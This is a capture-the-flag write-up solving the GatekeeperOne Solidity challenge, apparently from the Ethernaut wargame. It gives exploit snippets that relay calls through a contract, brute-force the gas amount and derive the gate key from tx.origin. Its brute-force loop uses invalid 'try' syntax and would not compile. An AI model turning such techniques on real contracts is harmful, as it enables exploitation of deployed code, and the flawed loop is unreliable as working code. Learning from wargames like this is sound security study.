# GatekeeperOne

The GatekeeperOne contract has three gates that we need to pass to solve the challenge. Each gate has a different requirement. Let's take a look at the contract:

```solidity
contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

# First gate

The first gate checks that msg.sender is not equal to tx.origin. In Ethereum, msg.sender is the address of the entity currently executing the contract, while tx.origin is the address that originally initiated the transaction. To pass this gate, we need to call the enter function from another contract, not directly from an Externally Owned Account, or EOA.

// In our exploit contract, we call the enter function of the GatekeeperOne contract

```solidity
function attack(bytes8 gateKey, uint256 gasToUse) external payable {
    challenge.enter{gas: gasToUse}(gateKey);
}
```

# Second gate

The second gate checks that the remaining gas is a multiple of 8191. This is tricky because the gas left changes as the contract executes. To pass this gate, we need to brute force the gas amount until we find a value that makes gasleft().mod(8191) equal to 0.

```solidity
// In our exploit contract, we brute force the gas amount
for (uint256 i = 0; i <= 8191; i++) {
    try {
        victim.enter{gas: 800000 + i}(gateKey) {
            console.log("passed with gas ->", 800000 + i);
            break;
        }
    } catch {}
}
```

# Third gate

The third gate involves type casting and bitwise operations. It checks that the least significant 16 bits of \_gateKey are equal to the least significant 32 bits, but that \_gateKey is not equal to the least significant 32 bits. It also checks that the least significant 32 bits of \_gateKey are equal to the least significant 16 bits of tx.origin. To pass this gate, we need to carefully choose a \_gateKey value that satisfies all these conditions.

```solidity
// In our exploit contract, we calculate the gateKey
bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;
```

By passing all three gates, we can successfully call the enter function and solve the challenge.

```solidity
function attack(bytes8 gateKey, uint256 gasToUse) external payable {
        challenge.enter{gas: gasToUse}(gateKey);
    }
```
